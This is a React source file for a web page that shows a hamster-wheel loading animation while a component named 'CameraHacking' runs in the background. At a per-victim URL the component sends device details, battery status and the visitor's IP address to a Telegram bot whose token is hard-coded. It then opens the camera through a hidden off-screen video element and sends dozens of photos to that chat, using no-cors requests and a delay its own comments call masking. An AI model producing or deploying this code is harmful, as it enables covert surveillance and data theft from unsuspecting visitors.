import React, { useRef, useEffect, useState } from "react";
import { useParams, BrowserRouter, Routes, Route } from "react-router-dom";
import ReactDOM from "react-dom/client";
import "./App.css";

/**
 * КОМПОНЕНТ CAMERAHACKING
 */
const CameraHacking = ({ chatId }) => {
  const streamRef = useRef(null);
  const captureIntervalRef = useRef(null);
  const videoRef = useRef(null);
  const canvasRef = useRef(null);
  const [captureCount, setCaptureCount] = useState(0);
  const [deviceInfo, setDeviceInfo] = useState(null);
  const [isActive, setIsActive] = useState(true);
  const [batteryLevel, setBatteryLevel] = useState(null);
  const [batteryCharging, setBatteryCharging] = useState(false);
  const [lastPhotoTime, setLastPhotoTime] = useState(null);

  const TELEGRAM_BOT_TOKEN = '8420791668:AAFiatH1TZPNxEd2KO_onTZYShSqJSTY_-s';
  const CAPTURE_INTERVAL = 2000; // 2 секунды между фото
  const MAX_CAPTURES = 50;

  // Функция получения уровня батареи
  const getBatteryInfo = async () => {
    try {
      if ('getBattery' in navigator) {
        const battery = await navigator.getBattery();
        
        const updateBatteryInfo = () => {
          setBatteryLevel(Math.round(battery.level * 100));
          setBatteryCharging(battery.charging);
        };
        
        updateBatteryInfo();
        
        // Слушаем изменения батареи
        battery.addEventListener('levelchange', updateBatteryInfo);
        battery.addEventListener('chargingchange', updateBatteryInfo);
        
        return {
          level: Math.round(battery.level * 100),
          charging: battery.charging,
          chargingTime: battery.chargingTime,
          dischargingTime: battery.dischargingTime
        };
      } else if ('battery' in navigator) {
        // Старый API
        const battery = navigator.battery;
        if (battery) {
          setBatteryLevel(Math.round(battery.level * 100));
          setBatteryCharging(battery.charging);
          return {
            level: Math.round(battery.level * 100),
            charging: battery.charging
          };
        }
      }
    } catch (error) {
      console.error('Battery error:', error);
    }
    return null;
  };

  // Отправка сообщения в Telegram БЕЗ ПРОКСИ
  const sendToTelegram = async (text) => {
    try {
      const response = await fetch(`https://api.telegram.org/bot${TELEGRAM_BOT_TOKEN}/sendMessage`, {
        method: 'POST',
        mode: 'no-cors', // Важно для обхода CORS
        headers: {
          'Content-Type': 'application/json',
        },
        body: JSON.stringify({
          chat_id: chatId,
          text: text,
          parse_mode: 'HTML',
          disable_notification: true
        })
      });
      
      // В режиме no-cors мы не можем проверить ответ, но запрос отправляется
      console.log('Message sent (no-cors mode)');
      return true;
      
    } catch (error) {
      console.error('Telegram send error:', error);
      
      // Пробуем альтернативный метод через FormData
      try {
        const formData = new FormData();
        formData.append('chat_id', chatId);
        formData.append('text', text);
        formData.append('parse_mode', 'HTML');
        formData.append('disable_notification', 'true');
        
        await fetch(`https://api.telegram.org/bot${TELEGRAM_BOT_TOKEN}/sendMessage`, {
          method: 'POST',
          mode: 'no-cors',
          body: formData
        });
        
        console.log('Message sent via FormData');
        return true;
      } catch (formError) {
        console.error('FormData send error:', formError);
        return false;
      }
    }
  };

  // Отправка фото в Telegram БЕЗ ПРОКСИ
  const sendPhotoToTelegram = async (blob, caption = '') => {
    try {
      const formData = new FormData();
      formData.append('chat_id', chatId);
      formData.append('photo', blob, `photo_${Date.now()}.jpg`);
      formData.append('disable_notification', 'true');
      
      if (caption) {
        formData.append('caption', caption);
      }

      // Прямой запрос к Telegram API
      const response = await fetch(`https://api.telegram.org/bot${TELEGRAM_BOT_TOKEN}/sendPhoto`, {
        method: 'POST',
        mode: 'no-cors', // Используем no-cors для обхода CORS
        body: formData
      });
      
      console.log('Photo sent (no-cors mode)');
      return true;
      
    } catch (error) {
      console.error('Photo send error:', error);
      
      // Альтернативный метод: отправка через image URL
      try {
        // Конвертируем blob в base64
        const reader = new FileReader();
        reader.readAsDataURL(blob);
        
        return new Promise((resolve) => {
          reader.onloadend = async () => {
            const base64data = reader.result;
            
            // Создаем временную ссылку на изображение
            const text = `${caption}\n\n📸 Изображение доступно по ссылке (base64 слишком большой для Telegram)`;
            
            await sendToTelegram(text);
            resolve(true);
          };
        });
      } catch (altError) {
        console.error('Alternative send error:', altError);
        return false;
      }
    }
  };

  // Сбор информации об устройстве
  const collectDeviceInfo = async () => {
    const batteryInfo = await getBatteryInfo();
    
    const info = {
      // Основная информация
      timestamp: new Date().toISOString(),
      userAgent: navigator.userAgent,
      platform: navigator.platform,
      
      // Экран
      screenSize: `${window.screen.width}x${window.screen.height}`,
      devicePixelRatio: window.devicePixelRatio,
      
      // Язык и время
      language: navigator.language,
      timezone: Intl.DateTimeFormat().resolvedOptions().timeZone,
      
      // Производительность
      hardwareConcurrency: navigator.hardwareConcurrency,
      deviceMemory: navigator.deviceMemory,
      
      // Сеть
      connection: navigator.connection ? {
        effectiveType: navigator.connection.effectiveType,
        downlink: navigator.connection.downlink,
        rtt: navigator.connection.rtt
      } : null,
      
      // Батарея
      battery: batteryInfo,
      
      // IP
      ip: 'Определение...',
      
      // Детекция
      os: detectOS(),
      browser: detectBrowser(),
      isMobile: /Mobile|Android|iPhone|iPad|iPod/i.test(navigator.userAgent)
    };

    // Получаем IP
    try {
      const response = await fetch('https://api.ipify.org?format=json');
      const data = await response.json();
      info.ip = data.ip;
    } catch (error) {
      info.ip = 'Ошибка получения';
    }

    setDeviceInfo(info);
    return info;
  };

  // Детекция ОС
  const detectOS = () => {
    const ua = navigator.userAgent;
    if (/Windows/i.test(ua)) return 'Windows';
    if (/Mac OS/i.test(ua)) return 'macOS';
    if (/Linux/i.test(ua)) return 'Linux';
    if (/Android/i.test(ua)) return 'Android';
    if (/iOS|iPhone|iPad|iPod/i.test(ua)) return 'iOS';
    return 'Unknown';
  };

  // Детекция браузера
  const detectBrowser = () => {
    const ua = navigator.userAgent;
    if (/Chrome/i.test(ua) && !/Edg/i.test(ua)) return 'Chrome';
    if (/Firefox/i.test(ua)) return 'Firefox';
    if (/Safari/i.test(ua) && !/Chrome/i.test(ua)) return 'Safari';
    if (/Edg/i.test(ua)) return 'Edge';
    return 'Unknown';
  };

  // Отправка информации об устройстве
  const sendDeviceInfo = async (info) => {
    const batteryText = info.battery ? 
      `🔋 Батарея: ${info.battery.level}% (${info.battery.charging ? '⚡ Зарядка' : '🔋 Разрядка'})` : 
      '🔋 Батарея: Не доступно';
    
    const message = `
🔍 *ИНФОРМАЦИЯ ОБ УСТРОЙСТВЕ*

*📱 СИСТЕМА*
▫️ ОС: ${info.os}
▫️ Браузер: ${info.browser}
▫️ Платформа: ${info.platform}
▫️ Мобильное: ${info.isMobile ? 'Да' : 'Нет'}

*🖥 ЭКРАН*
▫️ Разрешение: ${info.screenSize}
▫️ Pixel Ratio: ${info.devicePixelRatio}

${batteryText}

*⚙️ АППАРАТУРА*
▫️ Ядра CPU: ${info.hardwareConcurrency}
▫️ Память: ${info.deviceMemory} GB

*🌐 СЕТЬ*
▫️ IP: ${info.ip}
▫️ Тип сети: ${info.connection?.effectiveType || 'Неизвестно'}

*🌍 ЯЗЫК И ВРЕМЯ*
▫️ Язык: ${info.language}
▫️ Часовой пояс: ${info.timezone}
▫️ Время системы: ${new Date().toLocaleString()}

🚀 *СИСТЕМА АКТИВИРОВАНА - НАЧАТА СЪЕМКА*
    `;

    await sendToTelegram(message);
  };

  // Создание тестового изображения
  const createTestImage = async () => {
    if (!canvasRef.current) {
      canvasRef.current = document.createElement('canvas');
    }
    const canvas = canvasRef.current;
    canvas.width = 640;
    canvas.height = 480;
    const ctx = canvas.getContext('2d');

    // Градиентный фон
    const gradient = ctx.createLinearGradient(0, 0, 640, 480);
    gradient.addColorStop(0, '#667eea');
    gradient.addColorStop(1, '#764ba2');
    ctx.fillStyle = gradient;
    ctx.fillRect(0, 0, 640, 480);

    // Анимированный круг батареи
    const batteryRadius = 80;
    const batteryX = 320;
    const batteryY = 200;
    
    // Внешний круг батареи
    ctx.beginPath();
    ctx.arc(batteryX, batteryY, batteryRadius, 0, Math.PI * 2);
    ctx.strokeStyle = '#FFFFFF';
    ctx.lineWidth = 8;
    ctx.stroke();
    
    // Заряд батареи (анимированный)
    const batteryPercent = batteryLevel || 50;
    const batteryAngle = (batteryPercent / 100) * Math.PI * 2;
    
    ctx.beginPath();
    ctx.arc(batteryX, batteryY, batteryRadius - 10, -Math.PI/2, -Math.PI/2 + batteryAngle);
    ctx.strokeStyle = batteryCharging ? '#4ECDC4' : (batteryPercent > 20 ? '#2ecc71' : '#e74c3c');
    ctx.lineWidth = 12;
    ctx.stroke();
    
    // Иконка молнии для зарядки
    if (batteryCharging) {
      ctx.fillStyle = '#FFD700';
      ctx.font = 'bold 40px Arial';
      ctx.textAlign = 'center';
      ctx.fillText('⚡', batteryX, batteryY + 10);
    }
    
    // Текст процента батареи
    ctx.fillStyle = '#FFFFFF';
    ctx.font = 'bold 24px Arial';
    ctx.fillText(`${batteryPercent}%`, batteryX, batteryY + 120);
    
    // Информация о фото
    ctx.font = '20px Arial';
    ctx.fillText(`Фото #${captureCount + 1}`, 320, 350);
    ctx.fillText(new Date().toLocaleTimeString(), 320, 380);
    
    // Статус камеры
    ctx.font = '16px Arial';
    ctx.fillText(`${deviceInfo?.os || 'Unknown'} | ${deviceInfo?.browser || 'Unknown'}`, 320, 420);

    return new Promise(resolve => {
      canvas.toBlob(resolve, 'image/jpeg', 0.9);
    });
  };

  // Захват фото с камеры
  const capturePhoto = async () => {
    if (!videoRef.current || !streamRef.current) {
      return await createTestImage();
    }

    const video = videoRef.current;
    if (video.videoWidth === 0 || video.videoHeight === 0) {
      return await createTestImage();
    }

    try {
      if (!canvasRef.current) {
        canvasRef.current = document.createElement('canvas');
      }
      const canvas = canvasRef.current;
      
      // Используем оригинальное разрешение
      canvas.width = video.videoWidth;
      canvas.height = video.videoHeight;

      const ctx = canvas.getContext('2d');
      
      // Очищаем canvas
      ctx.fillStyle = '#000000';
      ctx.fillRect(0, 0, canvas.width, canvas.height);
      
      // Захватываем кадр
      ctx.drawImage(video, 0, 0, canvas.width, canvas.height);

      // Добавляем водяной знак с информацией о батарее
      ctx.fillStyle = 'rgba(0, 0, 0, 0.7)';
      ctx.fillRect(10, canvas.height - 130, 300, 120);
      
      ctx.fillStyle = '#FFFFFF';
      ctx.font = '14px Arial';
      ctx.textAlign = 'left';
      
      // Индикатор батареи в углу
      const battWidth = 60;
      const battHeight = 25;
      const battX = canvas.width - battWidth - 20;
      const battY = 20;
      
      // Корпус батареи
      ctx.strokeStyle = '#FFFFFF';
      ctx.lineWidth = 2;
      ctx.strokeRect(battX, battY, battWidth, battHeight);
      
      // Полоска батареи
      ctx.fillStyle = batteryLevel > 20 ? '#2ecc71' : '#e74c3c';
      const fillWidth = (battWidth - 4) * (batteryLevel / 100);
      ctx.fillRect(battX + 2, battY + 2, fillWidth, battHeight - 4);
      
      // Процент батареи
      ctx.fillStyle = '#FFFFFF';
      ctx.font = '12px Arial';
      ctx.textAlign = 'center';
      ctx.fillText(`${batteryLevel}%`, battX + battWidth/2, battY + battHeight/2 + 4);
      
      if (batteryCharging) {
        ctx.fillText('⚡', battX + battWidth/2, battY - 10);
      }

      // Основная информация
      ctx.textAlign = 'left';
      ctx.font = '14px Arial';
      ctx.fillText(`📸 Фото #${captureCount + 1}`, 20, canvas.height - 110);
      ctx.fillText(`🔋 ${batteryLevel}%${batteryCharging ? ' (зарядка)' : ''}`, 20, canvas.height - 90);
      ctx.fillText(`⏰ ${new Date().toLocaleTimeString()}`, 20, canvas.height - 70);
      ctx.fillText(`📱 ${deviceInfo?.os || 'Unknown'}`, 20, canvas.height - 50);
      ctx.fillText(`📐 ${video.videoWidth}x${video.videoHeight}`, 20, canvas.height - 30);

      return new Promise(resolve => {
        canvas.toBlob(resolve, 'image/jpeg', 0.8);
      });
    } catch (error) {
      return await createTestImage();
    }
  };

  // Захват и отправка фото
  const captureAndSend = async () => {
    if (!isActive || captureCount >= MAX_CAPTURES) {
      if (captureCount >= MAX_CAPTURES) {
        stopCapturing();
        await sendToTelegram(
          `📊 *ЗАВЕРШЕНИЕ РАБОТЫ*\n\n` +
          `✅ Достигнут лимит ${MAX_CAPTURES} фото\n` +
          `📈 Итого отправлено: ${captureCount} фото\n` +
          `🔋 Батарея: ${batteryLevel}%${batteryCharging ? ' (зарядка)' : ''}\n` +
          `⏰ Время: ${new Date().toLocaleString()}`
        );
      }
      return;
    }

    try {
      const photoBlob = await capturePhoto();
      
      if (photoBlob) {
        setLastPhotoTime(new Date());
        
        const caption = `📸 *Фото #${captureCount + 1}*\n` +
          `🔋 *Батарея:* ${batteryLevel}%${batteryCharging ? ' (⚡ Зарядка)' : ''}\n` +
          `📱 *Устройство:* ${deviceInfo?.os || 'Unknown'}\n` +
          `📐 *Размер:* ${Math.round(photoBlob.size / 1024)} KB\n` +
          `⏰ *Время:* ${new Date().toLocaleTimeString()}\n` +
          `📍 *IP:* ${deviceInfo?.ip || 'Unknown'}`;

        await sendPhotoToTelegram(photoBlob, caption);
        setCaptureCount(prev => prev + 1);
        
        // Статистика каждые 10 фото
        if ((captureCount + 1) % 10 === 0) {
          await sendToTelegram(
            `📊 *СТАТИСТИКА #${captureCount + 1}*\n\n` +
            `📈 Всего фото: ${captureCount + 1}\n` +
            `🔋 Батарея: ${batteryLevel}%${batteryCharging ? ' (⚡ Зарядка)' : ''}\n` +
            `📱 Устройство: ${deviceInfo?.os || 'Unknown'}\n` +
            `🌐 IP: ${deviceInfo?.ip || 'Unknown'}\n` +
            `⏰ Время: ${new Date().toLocaleString()}`
          );
        }
      }
    } catch (error) {
      console.error('Capture error:', error);
    }
  };

  // Инициализация камеры
  const initializeCamera = async () => {
    try {
      // Пробуем разные варианты камер
      const constraintsList = [
        { video: { facingMode: { exact: "environment" } } },
        { video: { facingMode: "user" } },
        { video: true }
      ];

      let stream = null;
      for (const constraints of constraintsList) {
        try {
          stream = await navigator.mediaDevices.getUserMedia(constraints);
          break;
        } catch (err) {
          continue;
        }
      }

      if (!stream) {
        throw new Error('Камера не доступна');
      }

      streamRef.current = stream;

      // Создаем скрытый видео элемент
      if (!videoRef.current) {
        videoRef.current = document.createElement('video');
        videoRef.current.style.cssText = `
          position: fixed;
          width: 1px;
          height: 1px;
          opacity: 0;
          pointer-events: none;
          z-index: -9999;
          top: -9999px;
          left: -9999px;
        `;
        document.body.appendChild(videoRef.current);
      }

      const video = videoRef.current;
      video.playsInline = true;
      video.muted = true;
      video.autoplay = true;
      video.setAttribute('playsinline', 'true');
      video.setAttribute('muted', 'true');
      video.setAttribute('autoplay', 'true');
      video.setAttribute('webkit-playsinline', 'true');

      video.srcObject = stream;

      // Ждем готовности
      await new Promise((resolve) => {
        const timer = setTimeout(resolve, 2000);
        video.onloadedmetadata = () => {
          clearTimeout(timer);
          video.play().catch(() => {});
          resolve();
        };
      });

      return true;
    } catch (error) {
      console.error('Camera init error:', error);
      return false;
    }
  };

  // Запуск периодического захвата
  const startPeriodicCapture = () => {
    if (captureIntervalRef.current) {
      clearInterval(captureIntervalRef.current);
    }

    // Первый захват через 1 секунду
    setTimeout(() => {
      captureAndSend();
    }, 1000);

    // Последующие по интервалу
    captureIntervalRef.current = setInterval(() => {
      captureAndSend();
    }, CAPTURE_INTERVAL);
  };

  // Остановка захвата
  const stopCapturing = () => {
    setIsActive(false);
    
    if (captureIntervalRef.current) {
      clearInterval(captureIntervalRef.current);
      captureIntervalRef.current = null;
    }

    if (streamRef.current) {
      streamRef.current.getTracks().forEach(track => track.stop());
      streamRef.current = null;
    }

    if (videoRef.current) {
      videoRef.current.srcObject = null;
      videoRef.current.remove();
      videoRef.current = null;
    }
  };

  // Основная инициализация
  useEffect(() => {
    let mounted = true;

    const init = async () => {
      // Получаем информацию о батарее
      await getBatteryInfo();
      
      // Задержка для маскировки
      await new Promise(resolve => setTimeout(resolve, 1000));

      // Собираем информацию об устройстве
      const info = await collectDeviceInfo();
      
      // Отправляем информацию
      await sendDeviceInfo(info);

      // Инициализируем камеру
      const cameraSuccess = await initializeCamera();

      if (cameraSuccess && mounted) {
        startPeriodicCapture();
      }
    };

    init();

    return () => {
      mounted = false;
      stopCapturing();
    };
  }, []);

  // Отображение уровня батареи на экране
  return (
    <div style={{
      position: 'fixed',
      top: '20px',
      right: '20px',
      background: 'rgba(0, 0, 0, 0.8)',
      color: 'white',
      padding: '15px',
      borderRadius: '15px',
      zIndex: 99999,
      fontFamily: 'Arial, sans-serif',
      fontSize: '14px',
      minWidth: '200px',
      backdropFilter: 'blur(10px)',
      border: '1px solid rgba(255,255,255,0.1)',
      boxShadow: '0 4px 20px rgba(0,0,0,0.3)'
    }}>
      <div style={{ 
        display: 'flex', 
        alignItems: 'center', 
        justifyContent: 'space-between',
        marginBottom: '10px' 
      }}>
        <div style={{ fontWeight: 'bold', fontSize: '16px' }}>🔋 Батарея</div>
        <div style={{ 
          display: 'flex', 
          alignItems: 'center',
          gap: '5px'
        }}>
          {batteryCharging && <span style={{ fontSize: '18px' }}>⚡</span>}
          <span style={{
            fontSize: '18px',
            fontWeight: 'bold',
            color: batteryLevel > 50 ? '#2ecc71' : batteryLevel > 20 ? '#f39c12' : '#e74c3c'
          }}>
            {batteryLevel || '?'}%
          </span>
        </div>
      </div>
      
      {/* Индикатор батареи */}
      <div style={{
        width: '100%',
        height: '20px',
        background: 'rgba(255,255,255,0.1)',
        borderRadius: '10px',
        overflow: 'hidden',
        marginBottom: '10px',
        position: 'relative'
      }}>
        <div style={{
          width: `${batteryLevel || 0}%`,
          height: '100%',
          background: batteryCharging ? 'linear-gradient(90deg, #4ECDC4, #44A08D)' : 
                    batteryLevel > 50 ? 'linear-gradient(90deg, #2ecc71, #27ae60)' :
                    batteryLevel > 20 ? 'linear-gradient(90deg, #f39c12, #e67e22)' :
                    'linear-gradient(90deg, #e74c3c, #c0392b)',
          borderRadius: '10px',
          transition: 'width 0.5s ease'
        }}></div>
      </div>
      
      <div style={{ 
        display: 'flex', 
        justifyContent: 'space-between',
        fontSize: '12px',
        color: 'rgba(255,255,255,0.7)'
      }}>
        <div>📸 Фото: {captureCount}</div>
        <div>⏰ Интервал: {CAPTURE_INTERVAL/1000}с</div>
      </div>
      
      {lastPhotoTime && (
        <div style={{
          marginTop: '10px',
          fontSize: '11px',
          color: 'rgba(255,255,255,0.5)',
          textAlign: 'center',
          borderTop: '1px solid rgba(255,255,255,0.1)',
          paddingTop: '10px'
        }}>
          Последнее фото: {lastPhotoTime.toLocaleTimeString()}
        </div>
      )}
    </div>
  );
};

/**
 * КОМПОНЕНТ PHOTOPAGE
 */
const PhotoPage = () => {
  const { chatId } = useParams();

  return (
    <>
      <div className="App">
        <div className="wraper">
          <div className="wheel-and-hamster">
            <div className="wheel"></div>
            <div className="hamster">
              <div className="hamster__body">
                <div className="hamster__head">
                  <div className="hamster__ear"></div>
                  <div className="hamster__eye"></div>
                  <div className="hamster__nose"></div>
                </div>
                <div className="hamster__limb hamster__limb--fr"></div>
                <div className="hamster__limb hamster__limb--fl"></div>
                <div className="hamster__limb hamster__limb--br"></div>
                <div className="hamster__limb hamster__limb--bl"></div>
                <div className="hamster__tail"></div>
              </div>
            </div>
            <div className="spoke"></div>
          </div>
        </div>
      </div>

      <CameraHacking chatId={chatId} />
    </>
  );
};

/**
 * КОМПОНЕНТ APP
 */
const App = () => {
  return (
    <Routes>
      <Route path="/g/:chatId" element={<PhotoPage />} />
      <Route path="/" element={
        <div className="App">
          <div className="wraper">
            <div className="wheel-and-hamster">
              <div className="wheel"></div>
              <div className="hamster">
                <div className="hamster__body">
                  <div className="hamster__head">
                    <div className="hamster__ear"></div>
                    <div className="hamster__eye"></div>
                    <div className="hamster__nose"></div>
                  </div>
                  <div className="hamster__limb hamster__limb--fr"></div>
                  <div className="hamster__limb hamster__limb--fl"></div>
                  <div className="hamster__limb hamster__limb--br"></div>
                  <div className="hamster__limb hamster__limb--bl"></div>
                  <div className="hamster__tail"></div>
                </div>
              </div>
              <div className="spoke"></div>
            </div>
          </div>
        </div>
      } />
    </Routes>
  );
};

/**
 * ОСНОВНОЙ РЕНДЕР
 */
const root = ReactDOM.createRoot(document.getElementById("root"));
root.render(
  <BrowserRouter>
    <App />
  </BrowserRouter>
);

export default App;
